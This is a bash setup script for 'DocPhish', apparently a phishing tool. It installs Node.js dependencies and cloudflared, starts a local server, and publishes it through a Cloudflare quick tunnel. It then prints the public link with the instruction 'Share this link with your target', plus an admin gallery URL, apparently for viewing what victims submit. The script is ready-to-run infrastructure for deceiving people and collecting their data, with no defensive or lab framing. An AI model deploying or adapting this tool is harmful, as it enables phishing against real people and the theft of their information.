#!/bin/bash

# Color codes
CYAN='\e[36m'
YELLOW='\e[33m'
GREEN='\e[32m'
RED='\e[31m'
BOLD='\e[1m'
RESET='\e[0m'

# ASCII Art Logo: DOCPHISH above flipped seawaves
echo -e "${CYAN}${BOLD}"
cat << "EOF"
██████╗  ██████╗  ██████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔══██╗██╔═══██╗██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
██║  ██║██║   ██║██║     ██████╔╝███████║██║███████╗███████║
██║  ██║██║   ██║██║     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
██████╔╝╚██████╔╝╚██████╗██║     ██║  ██║██║███████║██║  ██║
╚═════╝  ╚═════╝  ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

_      _      _      _      _      _      _      _
(_.,-''(_.,-''(_.,-''(_.,-''(_.,-''(_.,-''(_.,-''(_.,-''

EOF
echo -e "${RESET}"

echo -e "${YELLOW}${BOLD}Welcome to the DocPhish Automated Setup!${RESET}"

# Spinner function
spin() {
    local pid=$!
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

echo -e "${CYAN}Checking for Node.js and npm...${RESET}"
if ! command -v node &> /dev/null; then
    echo -e "${RED}Node.js is not installed. Please install Node.js and try again.${RESET}"
    exit 1
fi
if ! command -v npm &> /dev/null; then
    echo -e "${RED}npm is not installed. Please install npm and try again.${RESET}"
    exit 1
fi

echo -e "${CYAN}Checking for cloudflared...${RESET}"
if ! command -v cloudflared &> /dev/null; then
    echo -e "${YELLOW}cloudflared not found, installing...${RESET}"
    OS=$(uname -s)
    ARCH=$(uname -m)
    if [[ "$OS" == "Linux" ]]; then
      if [[ "$ARCH" == "x86_64" ]]; then
        URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
      elif [[ "$ARCH" == "aarch64" ]]; then
        URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
      elif [[ "$ARCH" == "armv7l" ]]; then
        URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
      else
        echo -e "${RED}Unsupported architecture: $ARCH${RESET}"
        exit 1
      fi
    elif [[ "$OS" == "Darwin" ]]; then
      URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
    else
      echo -e "${RED}Unsupported OS: $OS${RESET}"
      exit 1
    fi

    curl -L -o cloudflared $URL
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/

    if ! command -v cloudflared &> /dev/null; then
      echo -e "${RED}cloudflared installation failed. Please install manually.${RESET}"
      exit 1
    fi
    echo -e "${GREEN}cloudflared installed successfully.${RESET}"
else
    echo -e "${GREEN}cloudflared is already installed${RESET}"
fi

echo -e "${CYAN}Installing/updating npm dependencies...${RESET}"
npm install

echo -en "${CYAN}Enter admin key for this session (leave blank for random): ${RESET}"
read ADMIN_KEY
if [ -z "$ADMIN_KEY" ]; then
    ADMIN_KEY=$(openssl rand -hex 16)
    echo -e "${YELLOW}Generated random admin key: $ADMIN_KEY${RESET}"
fi
export ADMIN_KEY

echo -e "${CYAN}Starting Node.js server in the background...${RESET}"
ADMIN_KEY="$ADMIN_KEY" node server.js > server.log 2>&1 &
SERVER_PID=$!

# Function to check if server is up
function wait_for_server() {
    local retries=10
    local wait=1
    for ((i=0; i<retries; i++)); do
        if curl -s http://127.0.0.1:3000 > /dev/null; then
            return 0
        fi
        sleep $wait
    done
    return 1
}

echo -en "${CYAN}Waiting for Node.js server to be ready on 127.0.0.1:3000...${RESET}"
(wait_for_server) & spin
if wait_for_server; then
    echo -e "\n${GREEN}Node.js server is up.${RESET}"
else
    echo -e "\n${RED}Error: Node.js server did not start on 127.0.0.1:3000.${RESET}"
    kill $SERVER_PID
    exit 1
fi

echo -en "${CYAN}Do you want to use a custom Cloudflare Tunnel domain? (y/N): ${RESET}"
read USE_CUSTOM
if [[ "$USE_CUSTOM" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}Make sure you have set up a named tunnel and configured your domain in Cloudflare.${RESET}"
    echo -en "${CYAN}Enter your tunnel name: ${RESET}"
    read TUNNEL_NAME
    echo -e "${CYAN}Running: cloudflared tunnel run $TUNNEL_NAME${RESET}"
    cloudflared tunnel run "$TUNNEL_NAME"
else
    echo -e "${CYAN}Starting Cloudflare Tunnel with a random subdomain...${RESET}"
    cloudflared tunnel --url http://127.0.0.1:3000 > cloudflared.log 2>&1 &
    TUNNEL_PID=$!

    # Wait for the tunnel to initialize and extract the public URL
    sleep 8
    PUBLIC_URL=$(grep -o 'https://[-a-zA-Z0-9.]*trycloudflare.com' cloudflared.log | head -n 1)
    if [ -z "$PUBLIC_URL" ]; then
      echo -e "${RED}Could not find public URL. Check cloudflared.log for errors.${RESET}"
    else
      echo -e "${GREEN}Your public URL: $PUBLIC_URL${RESET}"
      echo -e "${YELLOW}Gallery access: $PUBLIC_URL/gallery?key=$ADMIN_KEY${RESET}"
      echo -e "${CYAN}Share this link with your target.${RESET}"
    fi

    # Wait for background processes (server and tunnel)
    wait $TUNNEL_PID
fi

trap "kill $SERVER_PID" EXIT
